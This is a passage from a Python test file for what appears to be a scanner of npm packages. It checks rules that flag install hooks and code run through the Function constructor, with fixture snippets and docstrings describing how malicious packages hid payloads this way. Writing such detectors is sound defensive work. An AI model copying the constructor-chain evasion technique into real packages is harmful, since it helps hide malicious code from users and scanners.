    )
    assert not rule.evaluate_code(
        _manifest_hooked(
            {"name": "patch-package", "scripts": {"postinstall": "patch-package"}, "bin": "x.js"}
        )
    )
    assert not rule.evaluate_code(
        _manifest_hooked(
            {
                "scripts": hooks,
                "dependencies": {"playwright": "1"},
                "bin": {"playwright": "evil.js"},
            }
        )
    )


def test_function_constructor_counts_for_new_packages_and_gains() -> None:
    """`txnforge` ran its payload through `globalThis.constructor.constructor` in a new
    package; Stages 2-3 saw neither `eval` nor `Function`."""
    rule = FunctionConstructor()
    code = b"const c = globalThis.constructor; const f = c.constructor; f(a, b)(x)"
    new = pkg(files={"lib/x.js": code})
    (finding,) = rule.evaluate_code(code_change(SNAP, new, None, CACHE, install_sources))
    assert finding.severity is Severity.MEDIUM
    assert [e.path for e in finding.evidence] == ["lib/x.js"]
    assert (finding.evidence[0].snippet or "").startswith("[constructor.constructor] c.constructor")
    (finding,) = rule.evaluate_code(change(new, PLAIN))  # gained in an update
    assert finding.rule_id == "code.function-constructor"
    assert rule.evaluate_code(change(new, new)) == ()  # the previous version did it already
    assert rule.evaluate_code(change(PLAIN, PLAIN)) == ()
    # `capability-gained` sees it as `dynamic-code` that isn't `eval`: LOW
    (gained,) = CapabilityGained().evaluate_code(change(new, PLAIN))
    assert gained.severity is Severity.LOW


def test_a_function_literals_constructor_is_low() -> None:
    """The only way to build an async function from text: code-mode executors use it."""
    rule = FunctionConstructor()
    literal = pkg(files={"lib/x.js": b"const AF = (async () => {}).constructor; new AF(a, b)"})
    (finding,) = rule.evaluate_code(change(literal, PLAIN))
    assert (finding.severity, finding.weight) == (Severity.LOW, 1.0)
    assert "function literal" in finding.explanation
    chain = pkg(files={"lib/y.js": b"run(x.constructor.constructor)"})
    both = literal | chain
    (finding,) = rule.evaluate_code(change(both, literal))  # only the chain is new
    assert finding.severity is Severity.MEDIUM
    assert [e.path for e in finding.evidence] == ["lib/y.js"]
    assert rule.evaluate_code(change(both, both)) == ()


def test_a_function_literals_constructor_given_the_loader_is_medium() -> None:
    """`smfos-bskdz-util@1.0.1` (2026-11-08): a payload decoded from package.json and run by
    `(function(){}).constructor("require", "__dirname", code)(require, __dirname)`."""
    code = b"var F = (function () {}).constructor; F('require', s)(require)"
    (finding,) = FunctionConstructor().evaluate_code(change(pkg(files={"x.js": code}), PLAIN))
    assert finding.severity is Severity.MEDIUM
    assert "hands Node's" in finding.explanation
